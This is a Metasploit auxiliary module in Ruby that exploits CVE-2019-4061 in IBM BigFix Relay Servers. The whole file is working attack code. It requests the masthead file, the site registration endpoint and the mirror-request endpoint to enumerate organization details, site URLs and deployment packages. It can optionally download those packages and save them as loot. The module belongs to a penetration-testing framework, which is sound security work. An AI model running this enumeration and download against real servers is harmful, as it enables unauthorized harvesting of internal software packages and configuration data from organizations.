##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'  => 'IBM BigFix Relay Server Sites and Package Enum',
      'Description' => %q{
        This module retrieves masthead, site, and available package information
        from IBM BigFix Relay Servers.
      },
      'Author' =>
        [
          'HD Moore',       # Vulnerability Discovery
          'Chris Bellows',  # Vulnerability Discovery
          'Ryan Hanson',    # Vulnerability Discovery
          'Jacob Robles'    # Metasploit module
        ],
      'References' =>
        [
          ['CVE','2019-4061'],
          ['URL','https://www.atredis.com/blog/2019/3/18/harvesting-data-from-bigfix-relay-servers']
        ],
      'DefaultOptions' =>
        {
          'RPORT' => 52311,
          'SSL'   => true
        },
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Mar 18 2019' # Blog post date
    ))

    register_options [
      OptString.new('TARGETURI', [true, 'Path to the BigFix server', '/']),
      OptBool.new('SHOW_MASTHEAD', [true, 'Retrieve information from masthead file', true]),
      OptBool.new('SHOW_SITES', [true, 'Retrieve site listing', true]),
      OptBool.new('SHOW_PACKAGES', [true, 'Retrieve packages list', true]),
      OptBool.new('DOWNLOAD', [true, 'Attempt to download packages', false])
    ]

    register_advanced_options [
      OptBool.new('ShowURL', [true, 'Show URL instead of filename', false])
    ]
  end

  def send_req(uri)
    send_request_cgi({
      'uri' => normalize_uri(target_uri, uri)
    })
  end

  def masthead
    res = send_req('masthead/masthead.axfm')
    return unless res && res.code == 200

    if res.body =~ /Organization: (.*)./
      print_good($1)
    end

    res.body.scan(/URL: (.*)./).each do |http|
      print_good(http[0])
    end
  end

  def sites
    res = send_req('cgi-bin/bfenterprise/clientregister.exe?RequestType=FetchCommands')
    return unless res && res.code == 200

    print_status('Sites')
    res.body.scan(/: ([^ ]+)/).each do |url|
      print_good(url[0])
    end
  end

  def packages
    res = send_req('cgi-bin/bfenterprise/BESMirrorRequest.exe')
    return unless res && res.code == 200

    print_status('Packages')
    last_action = nil
    @files = {}

    myhtml = res.get_html_document
    myhtml.css('.indented p').each do |element|
      element.children.each do |text|
        if text.class == Nokogiri::XML::Text
          next if text.text.start_with?('Error')

          text.text =~ /^([^ ]+)/
          case $1
          when 'Action:'
            # Save Action to associate URLs
            text.text =~ /Action: ([0-9]+)/
            last_action = $1
            @files[last_action] = []
            print_status("Action: #{last_action}")
          when 'url'
            text.text =~ /^[^:]+: (.*)/
            uri = URI.parse($1)
            file = File.basename(uri.path)
            @files[last_action].append(file)
            datastore['ShowURL'] ? print_good("URL: #{$1}") : print_good("File: #{file}")
          end
        end
      end
    end
  end

  def download
    print_status('Downloading packages')
    @files.each do |action, val|
      next if val.empty?
      res = send_req("bfmirror/downloads/#{action}/0")
      next unless res && res.code == 200

      print_status("Downloading file #{val.first}")
      res = send_req("bfmirror/downloads/#{action}/1")
      unless res && res.code == 200
        print_error("Failed to download #{val.first}")
        next
      end

      myloot = store_loot('ibm.bigfix.package', File.extname(val.first), datastore['RHOST'], res.body, val.first)
      print_good("Saved #{val.first} to #{myloot.to_s}")
    end
  end

  def run
    masthead if datastore['SHOW_MASTHEAD']
    sites if datastore['SHOW_SITES']
    packages if datastore['SHOW_PACKAGES'] || datastore['DOWNLOAD']
    download if datastore['DOWNLOAD'] && @files != {}
  end
end
